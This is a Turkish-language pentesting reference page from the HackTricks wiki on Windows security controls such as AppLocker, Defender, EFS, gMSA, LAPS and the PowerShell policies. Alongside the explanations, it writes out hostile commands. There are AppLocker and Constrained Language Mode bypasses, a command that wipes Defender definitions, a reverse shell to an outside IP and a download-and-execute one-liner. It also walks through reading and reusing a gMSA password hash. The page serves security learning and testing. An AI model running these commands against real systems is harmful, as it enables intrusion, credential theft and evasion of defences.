# Windows Güvenlik Kontrolleri

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Politikası

Uygulama beyaz listesi, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamaları veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı malware ve kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft'un **uygulama beyaz listeleme çözümü** olup sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Yürütülebilir dosyalar, scripts, Windows kurulum dosyaları, DLLs, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde **ayrıntılı kontrol** sağlar.\
Kuruluşlarda genellikle belirli dizinlere yazma erişimini kısıtlamak ve **cmd.exe and PowerShell.exe** engellemeleri yaygındır, **ancak bunların tamamı atlatılabilir**.

### Kontrol

Hangi dosyaların/uzantıların kara listeye/beyaz listeye alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir; sistemde uygulanan mevcut kurallar kümesini gözden geçirmek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **yazılabilir klasörler**: Eğer AppLocker `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu bypass etmek için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyalar AppLocker'ı atlatmak için de faydalı olabilir.
- **Zayıf yazılmış kurallar da atlatılabilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, her yere **`allowed` adlı bir klasör** oluşturabilirsiniz ve bu klasör izinli olacaktır.
- Kuruluşlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi **diğer** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) konumlarını unuturlar.
- Sistem üzerinde ek yük getirebileceği ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle **DLL enforcement çok nadiren etkinleştirilir**. Bu yüzden **DLL'leri arka kapı olarak kullanmak AppLocker'ı atlatmaya yardımcı olur**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir süreçte **Powershell** kodu **execute** edebilir ve AppLocker'ı atlayabilirsiniz. Daha fazla bilgi için bakınız: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur; parolalar hashlenmiştir.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA bazı kimlik bilgilerini diske kaydedebilir:

- Active Directory bilgisayar hesabının parolası (ulaşılamayan domain controller).
- Windows servis hesaplarının parolaları
- Zamanlanmış görevler için parolalar
- Diğerleri (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin veritabanıdır. Yalnızca Domain Controllers üzerinde bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir antivirüstür. **WinPEAS** gibi yaygın pentesting araçlarını **engeller**. Ancak, bu korumaları **atlatmanın** yolları vardır.

### Check

Defender'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ayrıca bunu listelemek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, dosyaları şifreleyerek korur ve bunun için **File Encryption Key (FEK)** olarak bilinen bir **simetrik anahtar** kullanır. Bu anahtar kullanıcının **public key**i ile şifrelenir ve şifreli dosyanın $EFS **alternative data stream** içinde saklanır. Dekriptaj gerektiğinde, ilgili kullanıcının dijital sertifikasının **private key**i FEK'i $EFS akışından deşifre etmek için kullanılır. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Kullanıcının başlatması olmadan deşifre senaryoları** şunlardır:

- Dosyalar veya klasörler non-EFS dosya sistemine, ör. [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), taşındığında otomatik olarak deşifre edilir.
- SMB/CIFS protokolü üzerinden ağda gönderilen şifreli dosyalar iletimden önce deşifre edilir.

Bu şifreleme yöntemi, dosya sahibine şifreli dosyalara **şeffaf erişim** sağlar. Ancak sahibin parolasını değiştirip oturum açmak tek başına deşifreye izin vermez.

**Önemli Noktalar**:

- EFS, kullanıcının public key'i ile şifrelenmiş simetrik bir FEK kullanır.
- Dekriptaj, FEK'e erişmek için kullanıcının private key'ini kullanır.
- Otomatik deşifreleme, FAT32'ye kopyalama veya ağ iletimi gibi belirli koşullarda gerçekleşir.
- Şifreli dosyalara sahip tarafından ek adım gerektirmeden erişilebilir.

### Check EFS info

Bir **kullanıcının** bu **servisi** **kullanıp kullanmadığını** şu yolun varlığını kontrol ederek anlayabilirsiniz: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimin** **eriştiğini** görmek için `cipher /c \<file\>` komutunu kullanın.  
Ayrıca bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **şifreleyebilir** ve **deşifre edebilirsiniz**.

### Decrypting EFS files

#### Authority System Olmak

Bu yöntem, kurban kullanıcının host üzerinde bir process çalıştırıyor olmasını gerektirir. Eğer durum buysa, bir `meterpreter` oturumu kullanarak kullanıcının process token'ını taklit edebilirsiniz (`impersonate_token` from `incognito`). Ya da doğrudan kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının parolasını bilmek


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT altyapılarında service account yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'lardan farklı olarak, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Parola Yönetimi**: gMSA'lar, alan (domain) veya bilgisayar politikasına göre otomatik değişen karmaşık, 240 karakterlik bir parola kullanır. Bu süreç Microsoft'un Key Distribution Service (KDC) tarafından yönetilir ve manuel parola güncellemelerine gerek bırakmaz.
- **Artırılmış Güvenlik**: Bu hesaplar kilitlenmeye karşı dayanıklıdır ve interactive logins için kullanılamaz, bu da güvenliği artırır.
- **Çoklu Host Desteği**: gMSA'lar birden fazla host arasında paylaşılabilir, bu da onları birden çok sunucuda çalışan servisler için ideal kılar.
- **Scheduled Task Desteği**: Managed service accounts'un aksine, gMSA'lar scheduled task çalıştırmayı destekler.
- **Basitleştirilmiş SPN Yönetimi**: Bilgisayarın sAMaccount bilgileri veya DNS adı değiştiğinde sistem Service Principal Name (SPN)'i otomatik günceller ve böylece SPN yönetimini basitleştirir.

gMSA'ların parolaları LDAP özelliği _**msDS-ManagedPassword**_'de saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde otomatik olarak sıfırlanır. Bu parola, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri blob'udur ve yalnızca yetkili yöneticiler ile gMSA'ların kurulu olduğu sunucular tarafından erişilebilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantının 'Sealing & Secure' ile doğrulanmış olması gerekir.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, bu [web page](https://cube0x0.github.io/Relaying-for-gMSA/) sayfasına bakın; **NTLM relay attack** ile **gMSA**'nin **password**'unu **read** etme hakkında bilgi veriyor.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

Birçok ortamda, düşük ayrıcalıklı kullanıcılar, hatalı yapılandırılmış nesne ACL'lerini suistimal ederek DC'yi ele geçirmeden gMSA sırlarına erişebilirler:

- Kontrol edebildiğiniz bir grup (ör. GenericAll/GenericWrite ile) gMSA üzerinde `ReadGMSAPassword` hakkı verilmiş olabilir.
- Kendinizi o gruba ekleyerek, LDAP üzerinden gMSA’nin `msDS-ManagedPassword` blob'unu okuma hakkını devralırsınız ve kullanılabilir NTLM kimlik bilgileri türetebilirsiniz.

Tipik iş akışı:

1) BloodHound ile yolu keşfedin ve foothold principals'lerinizi Owned olarak işaretleyin. Şu tür kenarlara bakın:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kontrol ettiğiniz ara gruba kendinizi ekleyin (bloodyAD ile örnek):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP üzerinden gMSA yönetilen parolasını okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword`'in çıkarılmasını ve NTLM'ye dönüştürülmesini otomatikleştirir:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash kullanarak gMSA olarak kimlik doğrulayın (düz metin gerekmez). Hesap Remote Management Users içindeyse, WinRM doğrudan çalışacaktır:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP okumaları `msDS-ManagedPassword` için sealing (ör. LDAPS/sign+seal) gerektirir. Araçlar bunu otomatik olarak halleder.
- gMSA'lara genellikle WinRM gibi yerel haklar verilir; yatay hareketi planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
- Sadece NTLM'i kendiniz hesaplamak için blob'a ihtiyacınız varsa, MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), yerel Administrator parolalarının yönetilmesini sağlar. Bu parolalar **rastgele oluşturulur**, benzersizdir ve **düzenli olarak değiştirilir**, merkezi olarak Active Directory'de saklanır. Bu parolalara erişim ACL'lerle yetkilendirilmiş kullanıcılara sınırlandırılmıştır. Yeterli izin verildiğinde, yerel admin parolalarını okuma imkanı elde edilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell'i etkili kullanmak için gerekli birçok özelliği **kısıtlar**, örneğin COM objelerini engelleme, yalnızca onaylı .NET tiplerine izin verme, XAML tabanlı iş akışları, PowerShell sınıfları ve daha fazlası.

### **Kontrol**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu bypass çalışmayabilir ancak [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\  
**Derlemek için muhtemelen** **şunu yapmanız gerekecek:** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **projeyi .Net4.5'e değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir süreçte **Powershell** kodunu çalıştırabilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için bakınız: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Yürütme Politikası

Varsayılan olarak **restricted.** olarak ayarlanmıştır. Bu politikayı atlamanın başlıca yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlası [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Kullanıcıları kimlik doğrulamak için kullanılabilen bir API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun tercih edilen yöntemi Kerberos'tur. Daha sonra SSPI hangi kimlik doğrulama protokolünün kullanılacağını müzakere edecektir; bu kimlik doğrulama protokollerine Security Support Provider (SSP) denir, her Windows makinesinin içinde DLL biçiminde bulunurlar ve iki makinenin iletişim kurabilmesi için aynı SSP'yi desteklemeleri gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakerede birkaç yöntem veya yalnızca bir yöntem sunulabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) yönetici ayrıcalığı gerektiren eylemler için bir **onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referanslar

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
